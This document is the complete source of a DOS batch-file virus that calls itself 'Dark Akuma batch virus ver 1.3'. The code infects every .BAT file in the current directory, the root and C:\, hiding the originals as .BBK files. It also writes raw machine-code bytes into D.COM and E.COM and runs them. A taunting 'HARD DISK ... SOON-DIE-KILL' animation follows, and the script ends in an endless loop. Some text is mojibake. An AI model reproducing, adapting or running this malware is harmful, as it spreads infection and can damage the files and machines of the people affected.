@ECHO OFF
IF %1X==/COPYVIRX GOTO COPY
IF %1X==/COPYVIR2X GOTO COPY2
IF %1X==/RENVIRX GOTO REN
IF %1X==/SETVIRX GOTO SET
IF NOT EXIST %0.BAT GOTO SICK
SET F=
IF NOT EXIST %0.BBK SET F=N
SET CD=.\
CALL %0 /COPYVIR
SET CD=\
CALL %0 /COPYVIR
SET CD=C:\
CALL %0 /COPYVIR
IF %F%X==NX ECHO @DEL %0.BAT > \N.BAT
IF %F%X==NX ECHO @IF EXIST %0.BBK DEL %0.BBK >> \N.BAT
IF %F%X==NX ECHO Bad command or file name
IF %F%X==NX ECHO \N.BAT >> %0.BAT
IF %F%X==NX GOTO END
TYPE %0.BBK > \N.BAT
@ECHO ON
@CALL \N.BAT %1 %2 %3 %4 %5 %6 %7 %8 %9
@ECHO OFF
IF EXIST \N.BAT DEL \N.BAT
GOTO END
:REN
echo\>DAKUMA\%2
IF EXIST DAKUMA\%0.BAT GOTO RENNOT
GOTO RENOK
:RENNOT
for %%a in (DAKUMA\*.*) DO DEL %%a
GOTO END
:RENOK
for %%a in (DAKUMA\*.*) DO DEL %%a
REN %2 *.BBK
ECHO\>%2
GOTO END
:COPY
IF EXIST %CD%*.BBK GOTO END
ECHO\ > \N.BAT
MD DAKUMA
FOR %%D IN (%CD%*.BAT) DO ECHO CALL %0 /RENVIR %%D>>\N.BAT
CALL \N.BAT
FOR %%B IN (%CD%*.BAT) DO CALL %0 /COPYVIR2 %%B
RD DAKUMA
GOTO END
:COPY2
echo\>DAKUMA\%2
IF EXIST DAKUMA\%0.BAT GOTO cpyNOT
GOTO cpyOK
:cpyNOT
for %%a in (DAKUMA\*.*) DO DEL %%a
GOTO END
:cpyOK
for %%a in (DAKUMA\*.*) DO DEL %%a
COPY %0.BAT %2 > NUL
GOTO END
:SICK
echo ╦╥0ш0М╠╡─мм >d.com
ECHO м> E.COM
D
ECHO    Dark Akuma    batch virus    ver 1.3   by  Dark  Akuma
ECHO\
ECHO  This is Dark Akuma virus 1.3  SUPER SOON-DIE-KILL version
ECHO  Ёo╛O║u╥t╤б╩╗╟╜║v╞f╛r 1.3 ╤W╞е║uюЧ╨╩╠Ч║v╙╘
ECHO\
ECHO  OH!!!! You semms no good..... HA!! HA!! HA!! HA!!
ECHO  ╤Б.... ╖A╛щ╟_╗с╝П╕Б╓ё╕nЁА!!!  ╚╒!! ╚╒!! ╚╒!! ╚╒!!
ECHO @ECHO OFF > T.BAT
ECHO IF %%1X==X SET C=1 >> T.BAT
ECHO IF %%1X==1X SET C=2 >> T.BAT
ECHO IF %%1X==2X SET C=3 >> T.BAT
ECHO IF %%1X==3X SET C=4 >> T.BAT
ECHO IF %%1X==4X SET C=5 >> T.BAT
ECHO IF %%1X==5X SET C=6 >> T.BAT
ECHO IF %%1X==6X SET C=7 >> T.BAT
ECHO IF %%1X==7X SET C=8 >> T.BAT
ECHO IF %%1X==8X SET C=9 >> T.BAT
ECHO IF %%1X==9X SET C=10 >> T.BAT
ECHO IF %%1X==10X SET C=11 >> T.BAT
ECHO IF %%1X==11X SET C=12 >> T.BAT
ECHO IF %%1X==12X SET C=13 >> T.BAT
ECHO IF %%1X==13X SET C=14 >> T.BAT
ECHO IF %%1X==14X SET C=15 >> T.BAT
ECHO IF %%1X==15X SET C=16 >> T.BAT
ECHO IF %%1X==16X SET C=17 >> T.BAT
ECHO IF %%1X==17X SET C=18 >> T.BAT
ECHO IF %%1X==18X SET C=19 >> T.BAT
ECHO IF %%1X==19X SET C=20 >> T.BAT
ECHO IF %%1X==20X GOTO END >> T.BAT
ECHO %%0 %%C%% >> T.BAT
ECHO :END  >> T.BAT
ECHO SET C= >> T.BAT
ECHO\
ECHO        зддддддддддд©
ECHO /Ё-     Ё HARD DISK Ё  Dark Akuma SOON-DIE-KILL
ECHO /I      юддддддддддды
CALL T
CLS
ECHO\
ECHO       зддддддддддд©
ECHO //Ё-    Ё HARD DISK Ё  Dark Akuma SOON-DIE-KILL
ECHO //I     юддддддддддды
CALL T
CLS
ECHO\
ECHO      зддддддддддд©
ECHO ///Ё-   Ё HARD DISK Ё  Dark Akuma SOON-DIE-KILL
ECHO ///I    юддддддддддды
CALL T
CLS
ECHO\
ECHO    зддддддддддд©
ECHO /////Ё- Ё HARD DISK Ё  Dark Akuma SOON-DIE-KILL
ECHO /////I  юддддддддддды
CALL T
CLS
ECHO\
ECHO   зддддддддддд©
ECHO //////Ё-Ё HARD DISK Ё  Dark Akuma SOON-DIE-KILL
ECHO //////I юддддддддддды
CALL T
CALL T
CALL T
CLS
ECHO\
ECHO             *   *     *
ECHO               *    *     *
ECHO              *  *      *
ECHO 
CLS
ECHO  дбд
ECHO ддедд        DIE...
ECHO  за©   /I\  збббббббббб©
ECHO зы ю©  / \  юааааааааааы
CALL T
CALL T
CALL T
E
:DOWN
GOTO DOWN
:END
